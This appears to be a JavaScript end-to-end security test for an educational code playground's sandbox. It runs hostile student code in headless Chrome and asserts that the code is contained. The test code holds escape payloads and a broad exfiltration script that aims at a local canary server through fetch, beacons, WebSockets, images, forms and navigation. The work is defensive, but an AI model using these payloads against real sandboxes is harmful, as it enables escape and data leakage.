// Usage: start api, web and sandbox, then: node apps/sandbox/e2e/security.e2e.mjs [screenshot.png]
// Env: WEB_URL (default http://localhost:3000), CHROME_PATH (Chrome/Chromium executable).
// Real-browser security test of the sandbox via headless Chrome + DevTools protocol.
// Runs "attacker" student code in /playground and asserts every escape attempt fails.
import { spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const BASE = process.env.WEB_URL ?? 'http://localhost:3000';
const OUT = process.argv[2];
const SANDBOX_URL = process.env.SANDBOX_URL ?? 'http://127.0.0.1:3100';
const CHROME = process.env.CHROME_PATH ?? 'C:/Program Files/Google/Chrome/Application/chrome.exe';
const port = 9800 + Math.floor(Math.random() * 100);
const chrome = spawn(CHROME, [
  '--headless=new',
  `--remote-debugging-port=${port}`,
  `--user-data-dir=${mkdtempSync(join(tmpdir(), 'sbx-'))}`,
  '--no-first-run',
  'about:blank',
]);

let wsUrl;
for (let i = 0; i < 50 && !wsUrl; i++) {
  try {
    wsUrl = (await (await fetch(`http://127.0.0.1:${port}/json`)).json()).find(
      (t) => t.type === 'page',
    )?.webSocketDebuggerUrl;
  } catch {
    // Chrome's debug endpoint is not up yet; retry.
  }
  if (!wsUrl) await new Promise((r) => setTimeout(r, 200));
}
const ws = new WebSocket(wsUrl);
await new Promise((r) => ws.addEventListener('open', r, { once: true }));
let id = 0;
const pending = new Map();
ws.addEventListener('message', (e) => {
  const m = JSON.parse(e.data);
  if (m.id && pending.has(m.id)) (pending.get(m.id)(m), pending.delete(m.id));
});
const send = (method, params = {}) =>
  new Promise((res) => {
    const i = ++id;
    pending.set(i, res);
    ws.send(JSON.stringify({ id: i, method, params }));
  });
const evaluate = async (expression) =>
  (await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true })).result
    .result.value;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let failed = 0;
const check = (ok, msg) => {
  console.log(`${ok ? 'OK  ' : 'FAIL'} ${msg}`);
  if (!ok) failed++;
};

await send('Page.enable');
await send('Emulation.setDeviceMetricsOverride', {
  width: 1400,
  height: 1000,
  deviceScaleFactor: 1,
  mobile: false,
});

async function loadProject(files) {
  await send('Page.navigate', { url: `${BASE}/playground` });
  await sleep(2500);
  await evaluate(
    `localStorage.setItem('wd-playground-v1', ${JSON.stringify(JSON.stringify(files))}); true`,
  );
  await send('Page.reload');
  await sleep(4000);
}
const clickRun = () =>
  evaluate(
    `[...document.querySelectorAll('button')].find(b => b.textContent.includes('Ishga tushirish')).click(); true`,
  );
const consoleText = () =>
  evaluate(
    `[...document.querySelectorAll('section[aria-label="Konsol"] li')].map(l => l.textContent).join('\\n')`,
  );
const statusText = () => evaluate(`document.querySelector('[role=status]')?.textContent ?? ''`);

// ---- 1. Normal run: preview renders and console works -----------------------
await loadProject([
  { path: 'index.html', content: '<h1>Salom</h1><script src="app.js"></script>' },
  { path: 'app.js', content: "console.log('ISHLADI', 1 + 1)" },
]);
await clickRun();
await sleep(2500);
check(
  (await consoleText()).includes('ISHLADI 2'),
  'normal run: console.log reaches the console panel',
);
check((await statusText()).includes('Tayyor'), 'normal run: status becomes Tayyor');

// ---- 1b. Hosted libraries: known CDN URLs work, anything else stays blocked ---
await loadProject([
  {
    path: 'index.html',
    content: `<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap-grid.min.css" rel="stylesheet">
<button class="btn btn-primary">B</button><i class="bi bi-house"></i><div class="other">x</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
<script src="app.js"></script>`,
  },
  {
    path: 'app.js',
    content: `addEventListener('load', async () => {
  const bg = getComputedStyle(document.querySelector('.btn')).backgroundColor;
  await document.fonts.ready;
  console.log('BS_CSS ' + bg, 'BS_JS ' + typeof bootstrap.Collapse, 'ICONS ' + document.fonts.check('16px bootstrap-icons'));
});`,
  },
]);
await clickRun();
await sleep(3000);
const libOut = await consoleText();
check(libOut.includes('BS_CSS rgb(13, 110, 253)'), 'hosted Bootstrap CSS loads from its CDN URL');
check(libOut.includes('BS_JS function'), 'hosted Bootstrap JS loads from its CDN URL');
check(libOut.includes('ICONS true'), 'hosted icon font loads');

// ---- 2. Escape attempts ------------------------------------------------------
const attack = `
const log = (k) => console.log(k);
try { parent.document.title; log('PARENT_DOM_OK'); } catch (e) { log('PARENT_DOM_BLOCKED'); }
try { top.document.title; log('TOP_DOM_OK'); } catch (e) { log('TOP_DOM_BLOCKED'); }
try { document.cookie = 'stolen=1'; log('COOKIE_OK:' + document.cookie); } catch (e) { log('COOKIE_BLOCKED'); }
try { localStorage.setItem('x', '1'); log('LS_OK'); } catch (e) { log('LS_BLOCKED'); }
try { const w = window.open('https://example.com'); log(w ? 'POPUP_OK' : 'POPUP_BLOCKED'); } catch (e) { log('POPUP_BLOCKED'); }
fetch('http://localhost:4000/health').then(() => log('FETCH_OK')).catch(() => log('FETCH_BLOCKED'));
fetch('http://localhost:3000/api/auth/me', { credentials: 'include' }).then(() => log('API_OK')).catch(() => log('API_BLOCKED'));
try { new WebSocket('ws://localhost:4000'); log('WS_CREATED'); } catch (e) { log('WS_BLOCKED'); }
const img = new Image(); img.onload = () => log('IMG_OK'); img.onerror = () => log('IMG_BLOCKED'); img.src = 'http://localhost:3000/favicon.ico';
parent.postMessage({ type: 'wd:console', runId: 'forged-run', level: 'log', text: 'FORGED_OTHER_RUN' }, '*');
try { top.location.href = 'https://example.com/'; log('TOPNAV_ATTEMPTED'); } catch (e) { log('TOPNAV_BLOCKED'); }
`;
await loadProject([
  { path: 'index.html', content: '<p>attack</p><script src="app.js"></script>' },
  { path: 'app.js', content: attack },
]);
const before = await evaluate('location.href');
await clickRun();
await sleep(4000);
const out = await consoleText();
console.log('--- preview console ---\n' + out + '\n-----------------------');
check(out.includes('PARENT_DOM_BLOCKED'), 'cannot read parent (runner) DOM');
check(out.includes('TOP_DOM_BLOCKED'), 'cannot read top (web app) DOM');
check(out.includes('COOKIE_BLOCKED'), 'no cookie access (opaque origin)');
check(out.includes('LS_BLOCKED'), 'no localStorage (opaque origin)');
check(out.includes('POPUP_BLOCKED'), 'cannot open popups');
check(out.includes('FETCH_BLOCKED'), 'fetch to API blocked (connect-src none)');
check(out.includes('API_BLOCKED'), 'fetch to web app with credentials blocked');
check(!out.includes('IMG_OK'), 'remote image blocked (img-src data/blob only)');
check(!out.includes('FORGED_OTHER_RUN'), 'forged message for another run is dropped');
check((await evaluate('location.href')) === before, 'top-level page was not navigated');
check(!(await evaluate('document.cookie')).includes('stolen'), 'web app cookies untouched');

// ---- 3. Infinite loop: watchdog recovers --------------------------------------
await loadProject([
  { path: 'index.html', content: '<script src="app.js"></script>' },
  { path: 'app.js', content: 'while (true) {}' },
]);
await clickRun();
await sleep(4500);
const alive = await Promise.race([evaluate('1 + 1'), sleep(3000).then(() => 'frozen')]);
check(alive === 2, 'web app stays responsive during an infinite loop');
check((await statusText()).includes('Vaqt tugadi'), 'watchdog reports a timeout');
await evaluate(
  `localStorage.setItem('wd-playground-v1', JSON.stringify([{path:'index.html',content:'<script>console.log("QAYTA")</script>'}])); true`,
);
await send('Page.reload');
await sleep(4000);
await clickRun();
await sleep(2500);
check((await consoleText()).includes('QAYTA'), 'a fresh run works after the timeout');

// ---- 4. Exfiltration: no channel reaches another server ------------------------
// A canary on an IP literal must not receive a single request. Control request first.
const hits = [];
const canary = createServer((req, res) => {
  hits.push(`${req.method} ${req.url}`);
  if (req.url === '/host.html') {
    // A foreign page (another site) that tries to embed and drive the runner (section 6).
    res.setHeader('content-type', 'text/html');
    res.end(`<script>window.__msgs = [];
addEventListener('message', (e) => window.__msgs.push(e.data && e.data.type));
const f = document.createElement('iframe');
f.src = ${JSON.stringify(SANDBOX_URL + '/runner.html')};
f.onload = () => f.contentWindow.postMessage({ type: 'wd:run', runId: 'evil-run', files: [{ path: 'index.html', content: '<script>console.log(1)<\\/script>' }] }, '*');
document.body.appendChild(f);</script>`);
    return;
  }
  res.setHeader('access-control-allow-origin', '*');
  res.end('canary');
});
canary.on('upgrade', (req, socket) => {
  hits.push(`UPGRADE ${req.url}`);
  socket.destroy();
});
await new Promise((r) => canary.listen(0, '127.0.0.1', r));
const CANARY = `http://127.0.0.1:${canary.address().port}`;
await fetch(`${CANARY}/control`);
check(hits.join() === 'GET /control', 'canary control request is received');
hits.length = 0;

const exfil = `
const C = ${JSON.stringify(CANARY)};
fetch(C + '/fetch').catch(() => {});
try { const x = new XMLHttpRequest(); x.open('GET', C + '/xhr'); x.send(); } catch {}
try { navigator.sendBeacon(C + '/beacon', 'leak'); } catch {}
try { new EventSource(C + '/sse'); } catch {}
try { new WebSocket(C.replace('http', 'ws') + '/ws'); } catch {}
try { new Worker(C + '/worker.js'); } catch {}
const img = new Image(); img.src = C + '/img';
const s = document.createElement('style'); s.textContent = 'body{background:url(' + C + '/css)}'; document.head.appendChild(s);
const l = document.createElement('link'); l.rel = 'prefetch'; l.href = C + '/prefetch'; document.head.appendChild(l);
const fr = document.createElement('iframe'); fr.src = C + '/iframe'; document.body.appendChild(fr);
const f = document.createElement('form'); f.action = C + '/form'; f.method = 'post'; document.body.appendChild(f);
try { f.submit(); } catch {}
try { window.open(C + '/popup'); } catch {}
setTimeout(() => { location.href = C + '/navigate?leak=1'; }, 300);
console.log('EXFIL_DONE');
`;
await loadProject([
  { path: 'index.html', content: '<p>exfil</p><script src="app.js"></script>' },
  { path: 'app.js', content: exfil },
]);
await clickRun();
await sleep(4000);
check((await consoleText()).includes('EXFIL_DONE'), 'exfiltration attempts actually ran');
check(hits.length === 0, `no request reached the canary (${hits.join(', ') || 'none'})`);

// ---- 5. Busy loop after load: the web app stays responsive ---------------------
await loadProject([
  {
    path: 'index.html',
    content: '<script>console.log("BOSHLANDI"); setTimeout(() => { for (;;) {} }, 300);</script>',
  },
]);
await clickRun();
await sleep(2500);
const alive2 = await Promise.race([evaluate('2 + 2'), sleep(3000).then(() => 'frozen')]);
check(alive2 === 4, 'web app stays responsive during a loop that starts after load');

// ---- 6. A foreign site cannot embed or drive the runner ------------------------
await send('Page.navigate', { url: `${CANARY}/host.html` });
await sleep(3000);
const foreign = await evaluate('JSON.stringify(window.__msgs)');
check(foreign === '[]', `runner sends nothing to a foreign embedder (${foreign})`);
canary.close();

const shot = await send('Page.captureScreenshot', { format: 'png' });
if (OUT) writeFileSync(OUT, Buffer.from(shot.result.data, 'base64'));

ws.close();
chrome.kill();
console.log(failed ? `\n${failed} FAILED` : '\nALL PASSED');
process.exit(failed ? 1 : 0);
